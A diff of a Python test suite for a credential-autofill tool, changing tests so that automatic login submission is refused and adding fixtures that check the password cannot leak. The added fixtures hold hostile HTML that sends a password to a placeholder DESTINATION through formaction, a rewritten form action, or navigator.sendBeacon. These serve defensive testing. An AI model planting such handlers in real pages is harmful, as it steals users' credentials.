@@ -27,6 +27,7 @@ window.eval = function(src) {
 </script>
 <form><input id=user name=username><input id=pw type=password><button>Go</button></form>""",
 }
+SUBMIT_ERROR = "automatic submission is unavailable; fill without submit and submit manually"
 ITEM = {"share_id": "share1", "item_id": "item1", "reason": "log in"}
 
 
@@ -145,18 +146,15 @@ def test_fill_types_only_into_the_visible_main_frame_password_of_the_item_origin
         c.close()
 
 
-def test_fill_submit_presses_enter_and_clears_the_password_only_off_origin(lab):
+def test_fill_refuses_automatic_submission_without_filling_or_approval(lab):
     d, c = server(lab)
     op = Operator(d)
     try:
-        with tab(lab, "/stuck.html") as page:
-            got = c.call("fill_login", submit=True, **ITEM)
-            assert got == {"filled": ["username", "password"], "submitted": True}, got
-            assert [value(page, "#user"), value(page, "#pw")] == ["ada", PASSWORD]
-        with tab(lab, "/login.html") as page:
-            got = c.call("fill_login", submit=True, **ITEM)
-            assert got == {"filled": ["username", "password"], "submitted": True}, got
-            page.wait_for_url(f"{lab.good}/done.html?username=ada", timeout=5000)
+        for path in ("/stuck.html", "/login.html"):
+            with tab(lab, path) as page:
+                assert error(c, "fill_login", submit=True, **ITEM) == SUBMIT_ERROR
+                assert [value(page, "#user"), value(page, "#pw")] == ["", ""]
+                assert op.prompts == []
     finally:
         op.close()
         c.close()
@@ -217,7 +215,7 @@ def test_fill_submit_refuses_a_cross_origin_form_action(lab):
     try:
         with tab(lab, "/away.html") as page:
             got = error(c, "fill_login", submit=True, **ITEM)
-            assert got == "form action origin does not match", got
+            assert got == SUBMIT_ERROR, got
             assert page.url.startswith(lab.good + "/away.html"), page.url
             assert PASSWORD not in page.content()
     finally:
@@ -225,18 +223,77 @@ def test_fill_submit_refuses_a_cross_origin_form_action(lab):
         c.close()
 
 
-def test_fill_submit_clears_every_field_that_held_the_password(lab):
+def test_fill_refuses_automatic_submission_even_for_scripted_navigation(lab):
     d, c = server(lab)
     op = Operator(d)
     try:
         with tab(lab, "/copy.html") as page:
-            got = c.call("fill_login", submit=True, **ITEM)
-            assert got == {"filled": ["username", "password"], "submitted": True}, got
-            page.wait_for_url(f"{lab.bad}/landed.html", timeout=5000)
-            assert [value(page, "#pw"), value(page, "#copy")] == ["", ""], [value(page, "#pw"), value(page, "#copy")]
+            assert error(c, "fill_login", submit=True, **ITEM) == SUBMIT_ERROR
+            assert page.url == f"{lab.good}/copy.html"
+            assert value(page, "#pw") == ""
+            assert op.prompts == []
     finally:
         op.close()
         c.close()
+
+
+def assert_no_automatic_secret_request(lab, attack):
+    received = []
+
+    class Collector(Quiet):
+        def do_GET(self):
+            received.append(self.path)
+            self.send_response(200)
+            self.end_headers()
+
+        def do_POST(self):
+            received.append(self.rfile.read(int(self.headers.get("Content-Length", 0))).decode())
+            self.send_response(200)
+            self.end_headers()
+
+    collector = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Collector)
+    threading.Thread(target=collector.serve_forever, daemon=True).start()
+    destination = f"http://127.0.0.1:{collector.server_address[1]}/collect"
+    html = attack.replace("DESTINATION", destination)
+    d, c = server(lab)
+    op = Operator(d)
+    page = lab.ctx.new_page()
+    page.route(lab.good + "/attack.html", lambda route: route.fulfill(body=html, content_type="text/html"))
+    try:
+        page.goto(lab.good + "/attack.html")
+        try:
+            got = c.call("fill_login", submit=True, **ITEM)
+        except RuntimeError as exc:
+            got = str(exc)
+        page.wait_for_timeout(200)
+        assert not any(PASSWORD in request for request in received), received
+        assert got == SUBMIT_ERROR, got
+        assert value(page, "#pw") == ""
+        assert op.prompts == []
+    finally:
+        page.close()
+        op.close()
+        c.close()
+        collector.shutdown()
+        collector.server_close()
+
+
+def test_fill_submitter_formaction_cannot_send_the_password(lab):
+    assert_no_automatic_secret_request(lab, """<form action=/done.html>
+<input name=username><input id=pw name=password type=password>
+<button formaction="DESTINATION">Go</button></form>""")
+
+
+def test_fill_input_handler_cannot_change_the_submission_destination(lab):
+    assert_no_automatic_secret_request(lab, """<form action=/done.html>
+<input name=username><input id=pw name=password type=password oninput="this.form.action='DESTINATION'">
+<button>Go</button></form>""")
+
+
+def test_fill_input_handler_cannot_send_a_beacon_during_auto_submit(lab):
+    assert_no_automatic_secret_request(lab, """<form action=/done.html>
+<input name=username><input id=pw name=password type=password oninput="navigator.sendBeacon('DESTINATION',this.value)">
+<button>Go</button></form>""")
 
 
 def test_fill_fails_closed_without_an_allow(lab):
